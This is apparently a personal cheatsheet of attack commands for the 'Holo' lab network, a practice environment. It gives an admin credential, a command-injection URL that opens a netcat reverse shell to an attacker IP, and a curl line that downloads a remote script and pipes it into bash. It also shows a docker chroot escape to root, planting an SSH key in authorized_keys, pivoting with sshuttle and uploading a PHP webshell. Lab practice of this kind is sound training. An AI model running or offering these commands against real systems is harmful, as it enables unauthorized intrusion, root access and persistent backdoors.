# Holo Cheatsheet

 [http://admin.holo.live/](http://admin.holo.live/)
Log in with the credentials `admin:DBManagerLogin!`

http://admin.holo.live/dashboard.php?cmd=nc+-e+/bin/sh+10.50.107.22+4444

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```



www-data@f988aa7b2fb3:/var/www/html$ `curl 192.168.100.1:8080/shell.php?cmd=whoami`

www-data@69cd1465ecc9:/var/www/admin$ `curl 192.168.100.1:8080/shell.php?cmd=hostname`


`nc -lvnp 53`

```
curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.107.22%3A80%2Fshellscript.sh%7Cbash%20%26'
```

`python3 -m http.server 80`

`/usr/bin/docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt bash`

`cd ~/.ssh`
`ssh-keygen -t rsa`
`cat id_rsa.pub`

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCymd1SBNCCtwnLevPQupq7Zy/YxDIDdIHfhcv894fhTAfG+i4SgqBrLaHuwfIRU8MJh5at3nbNaINX7rre3W/BeUwamYSPh18x4xI3c4zcJ5iXUi5MZ/1qFPJNHLkogYyhTDW1Uc89/QDIYXhdzGRgqPnQUFg01juNkfoYFeGFmRFgrg4GzP3KwIW7hJGd0Zt4IXtrTldxpSAqnLjZk4P4lKoWAJsc3wvUTHyd0qM5Bhpr87uksCqB/U3KzMpD3V9cSuuwh+/xRNuVX2IsYHoqccmYuLwKXcfzY7yt6ueoFf+oGUMXB+Q3W9HdbxMGGwSsowfU4R1a0IO+9h5/raZOhDhsfXmURrlCjpAtdbt7TWPc//9OnThf5Zi6TkzKpbem3nIH7rHMzdzpi9/8dmPtNrpZ6Ddk6R1ktPw3MtcoWC6FfWSrr5BIanHq17fEbzlPayrGK/LRvXUvYICpEilHJrlfpAfMF0qR1GptD9HW2Vk760JfIaw3bnir7+BYKr0= kali@kali" > authorized_keys

`ssh root@admin.holo.live -i id_rsa`



`sshuttle -r root@admin.holo.live --ssh-cmd "ssh -i /home/kali/.ssh/id_rsa" 10.200.110.0/24 -x 10.200.110.33`


[[Task 28 - Hide yo' Kids, Hide yo' Wives, Hide yo' Tokens#Your job|7. Accesing S-SRV01 Web]]


1. Create a php file with the above code on your attacking machine `webshell.php`.
2. Navigate to http://10.200.X.31/img_upload.php and upload the file.
3. Navigate to http://10.200.X.31/images/webshell.php.



```bash
type C:\Users\Administrator\Desktop\root.txt
```

[[Task 36 -  That's not a cat that's a dawg#Running hoaxshell|9. Hoaxhell]]


